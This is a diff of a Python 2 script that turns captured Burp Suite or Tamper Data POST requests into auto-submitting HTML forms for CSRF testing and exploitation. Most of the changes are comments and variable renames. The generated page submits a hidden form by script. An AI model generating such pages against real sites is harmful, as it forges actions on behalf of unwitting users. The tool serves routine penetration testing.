@@ -15,7 +15,7 @@ def usage():
 	print "This tool will help you to create you auto-submit HTML form for CSRF vulnerability testing and exploitation."
 	print "It takes input from TamperData or BurpSuite analysis. Just copy/paste the request content in a in.txt file and give it to this script."
 	print "\nUsage : python " + sys.argv[0] + " -i <input file> -f <format>"
-	print " -f : Data format, possible format are :\n    Burp (for Burpsuite)\n    Tamper (for TamperData)"
+	print " -f : Data format, possible format are :\n    Burp (for BurpSuite)\n    Tamper (for TamperData)"
 	print " -i : input file containing data"
 	print " -o : output file destination, otherwhise output is written in terminal"
 	print "\n===================================\nExample :\n"
@@ -24,9 +24,13 @@ def usage():
 	return
 
 def processBurpSuite(data):
+	''' Process Burp Suite formatted request to build auto submit HTML form'''
+	# Extract URL/Server name or IP from data
 	servName= re.search("Host: (.*)User-Agent", data, re.IGNORECASE)
 	servURL = re.search("POST (.*) HTTP/", data, re.IGNORECASE)
+	# Build HTML Form
 	output= "<form method=POST action='http://" + servName.group(1) + servURL.group(1)+"'>\n"
+	# Extract POST parameters
 	parameters = re.search("Connection:.close(.*)$", data, re.IGNORECASE)
 	parameters = parameters.group(1)
 	parameters = urllib.unquote(parameters.encode('ascii')).decode('utf-8')
@@ -41,9 +45,13 @@ def processBurpSuite(data):
 	return output
 
 def processTamperData(data):
+	''' Process Tamper Data formatted request to build auto submit HTML form '''
+	# Extract URL/Server name or IP from data
         servURL = re.search("POST (.*) Load Flag", data, re.IGNORECASE)
+	# build HTML form
         output = "<form method=POST action='"+ servURL.group(1)+"'>\n"
-        parameters = re.search("Post Data:      (.*)   Response", data, re.IGNORECASE)
+  	# Extract POST parameters
+	parameters = re.search("Post Data:      (.*)   Response", data, re.IGNORECASE)
         parameters = parameters.group(1)
 	parameters = parameters.replace ("      ","&")
         parameters = urllib.unquote(parameters.encode('ascii')).decode('utf-8')
@@ -62,6 +70,7 @@ def processTamperData(data):
 myopts, args = getopt.getopt(sys.argv[1:], "i:o:f:h")
 outputFile=""
 
+# Option processing part
 if len(sys.argv) > 2:
         inputFile = sys.argv[1]
         dataFormat = sys.argv[2]
@@ -81,30 +90,34 @@ for o, a in myopts:
 
 dataToProcess = ""
 # Process data to delete return and space. 
-# more easy to process then
+# more easy to retrieve parameters then.
 inFile = open(inputFile)
 
-Display = "<html><body> \n"
+htmlForm = "<html><body> \n"
 
+# Remove space and return
 for line in inFile:
     dataToProcess = dataToProcess + line.rstrip('\r\n')
 
+# Process data according to specified format
 if dataFormat == "Burp":
-	Display = Display + processBurpSuite (dataToProcess)
+	htmlForm = htmlForm + processBurpSuite (dataToProcess)
 elif dataFormat == "Tamper":
-	Display = Display + processTamperData (dataToProcess)
+	htmlForm = htmlForm + processTamperData (dataToProcess)
 else :
 	print "Please specifiy an available data format"
 	usage()
 	exit(0)
 
-Display = Display +"\t<input style=\"display:none\" type=submit>\n<form>\n<script>document.forms[0].submit();</script>\n</body></html>"
+# Add end of HTML form
+htmlForm = htmlForm +"\t<input style=\"display:none\" type=submit>\n<form>\n<script>document.forms[0].submit();</script>\n</body></html>"
 
-
+# If an output file is specified, write form in it
 if outputFile != "":
 	file = open(outputFile, "w")
-	file.write(Display)
+	file.write(htmlForm)
 	file.close()
 	print "Your HTML from is in this file : "+outputFile
+# Otherwise, write output in terminal directly
 else:
-	print Display
+	print htmlForm
